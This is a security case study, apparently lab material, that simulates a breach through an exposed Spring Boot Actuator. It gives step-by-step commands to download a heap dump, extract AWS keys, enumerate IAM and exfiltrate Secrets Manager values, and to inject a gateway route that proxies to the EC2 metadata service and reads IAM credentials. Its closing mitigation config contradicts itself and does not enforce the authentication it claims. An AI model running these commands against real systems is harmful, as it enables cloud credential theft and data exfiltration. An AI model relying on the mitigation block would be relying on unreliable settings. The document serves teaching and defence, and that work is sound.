# Case Study: Spring Boot Actuator Data Leak (Volkswagen Breach Simulation)

## Overview
This case study documents a simulated reproduction of the **March 2021 Volkswagen Group data breach**, where attackers exploited a publicly exposed Spring Boot Actuator instance to extract heap dumps containing AWS credentials. The breach resulted in the exposure of over 3.3 million customer records including driver license numbers, contact details, and loan eligibility data.

The simulation covers two attack chains:
1. **Heap Dump Exposure** → AWS credential extraction → Secrets Manager exfiltration
2. **SSRF via Spring Cloud Gateway** → EC2 metadata access

## MITRE ATT&CK Mapping

| Tactic | Technique |
|--------|-----------|
| **Initial Access (TA0001)** | Exploit Public-Facing Application — exposed Actuator endpoints |
| **Discovery (TA0007)** | Cloud Infrastructure Discovery — IAM enumeration |
| **Collection (TA0009)** | Data from Information Repositories — heap dump extraction |
| **Exfiltration (TA0010)** | Exfiltration Over Web Service — Secrets Manager retrieval |

---

## Chain 1: Heap Dump → AWS Credential Theft → Secrets Manager

### Step 1: Discover exposed Actuator
```bash
curl http://target:8080/actuator
```

The `/actuator` endpoint returns a JSON listing of all exposed sub-endpoints. Key finding: `/actuator/heapdump` is accessible without authentication.

### Step 2: Download the heap dump
```bash
curl -o heapdump.hprof http://target:8080/actuator/heapdump
```

The `.hprof` file is a snapshot of the JVM's entire memory — every object, string, credential, and session token currently in the application's memory.

### Step 3: Extract AWS credentials from memory
```bash
strings heapdump.hprof | grep -i "aws_access_key"
strings heapdump.hprof | grep -i "aws_secret_access_key"
```

The heap dump contains AWS credentials that were loaded as environment variables or configuration properties. Even though `/actuator/env` may mask these values with `******`, the heap dump holds the **raw unmasked values** in memory.

### Step 4: Configure AWS CLI with stolen credentials
```bash
aws configure --profile actuator
# Enter the extracted Access Key ID and Secret Access Key
```

### Step 5: Validate access and identify the user
```bash
aws sts get-caller-identity --profile actuator
```

This confirms which AWS account and IAM user the credentials belong to (e.g., `Actuator_User`).

### Step 6: Enumerate IAM permissions
```bash
# List inline policies
aws iam list-user-policies --user-name Actuator_User --profile actuator

# Get policy details
aws iam get-user-policy --user-name Actuator_User \
  --policy-name User_Policy --profile actuator
```

The policy reveals that the user has:
- `iam:ListUserPolicies` and `iam:GetUserPolicy` — can see its own permissions
- `secretsmanager:GetSecretValue` — can read specific secrets

### Step 7: Exfiltrate secrets
```bash
aws secretsmanager get-secret-value \
  --secret-id SpringBoot_Actuator \
  --region ap-northeast-1 \
  --profile actuator
```

The secret contains sensitive application data — in the real-world breach, this path led to 3.3 million customer records.

### Chain 1 Summary
```
Exposed /actuator/heapdump
  → Download JVM memory snapshot
    → Extract AWS credentials via strings grep
      → Configure AWS CLI
        → Enumerate IAM permissions
          → Exfiltrate secrets from Secrets Manager
```

---

## Chain 2: SSRF via Spring Cloud Gateway → EC2 Metadata

### Step 1: Discover exposed Gateway routes
```bash
curl http://target:8080/actuator/gateway/routes
```

The Spring Cloud Gateway's route configuration is exposed, showing all currently configured proxy routes.

### Step 2: Inject a malicious route to the metadata service
```bash
curl -X POST "http://target:8080/actuator/gateway/routes/imds-route" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "imds-route",
    "uri": "http://169.254.169.254",
    "predicates": [
      {
        "name": "Path",
        "args": {
          "pattern": "/latest/**"
        }
      }
    ]
  }'
```

This creates a new route that proxies any request matching `/latest/**` to the AWS Instance Metadata Service (IMDS) at `169.254.169.254`.

### Step 3: Refresh the gateway to apply the route
```bash
curl -X POST "http://target:8080/actuator/gateway/refresh"
```

### Step 4: Access EC2 metadata through the gateway
```bash
# List available metadata categories
curl http://target:8080/latest/meta-data/

# Extract instance identity
curl http://target:8080/latest/meta-data/instance-id

# Extract IAM role credentials (if attached)
curl http://target:8080/latest/meta-data/iam/security-credentials/
```

The gateway now acts as an SSRF proxy, forwarding requests to the internal metadata service. This can expose:
- Instance ID, region, availability zone
- IAM role temporary credentials
- User data scripts (may contain secrets)
- Network configuration

### Chain 2 Summary
```
Exposed /actuator/gateway/routes
  → POST new route proxying to 169.254.169.254
    → Refresh gateway configuration
      → Query /latest/meta-data/ through the proxy
        → Extract instance metadata and IAM credentials
```

---

## Key Takeaways

1. **Spring Boot Actuator endpoints must never be exposed publicly** — they are developer tools, not production interfaces. In the real Volkswagen breach, this single misconfiguration led to 3.3 million records exposed.

2. **Heap dumps contain unmasked secrets** — even when `/actuator/env` masks sensitive values, the `/actuator/heapdump` endpoint contains raw, unmasked credentials in JVM memory. This is often overlooked.

3. **Spring Cloud Gateway route injection = full SSRF** — if `/actuator/gateway/routes` allows POST requests, an attacker can create arbitrary proxy routes to internal services, cloud metadata APIs, or internal networks.

4. **IMDS v1 is vulnerable to SSRF** — the AWS metadata service at `169.254.169.254` responds to any HTTP request without authentication. Use IMDSv2 (which requires a token) to mitigate SSRF-based metadata theft.

5. **Credential chain attacks** — the path from heap dump → AWS credentials → Secrets Manager → customer data demonstrates how a single misconfiguration can cascade into a full data breach.

## Mitigation

```properties
# Disable dangerous actuator endpoints
management.endpoints.web.exposure.include=health,info
management.endpoint.heapdump.enabled=false
management.endpoint.env.enabled=false
management.endpoint.gateway.enabled=false

# Require authentication for actuator
management.endpoints.web.exposure.exclude=*
spring.security.user.name=admin
spring.security.user.password=STRONG_PASSWORD

# Use IMDSv2 on AWS EC2
# aws ec2 modify-instance-metadata-options \
#   --instance-id i-xxx --http-tokens required
```

## References

- [Wiz.io: Spring Boot Actuator Misconfigurations](https://www.wiz.io/blog/spring-boot-actuator-misconfigurations)
- `techniques/spring-boot-actuator-exploitation.md`
- `web-vulnerabilities/ssrf.md`
- `methodology/web-recon-methodology.md`
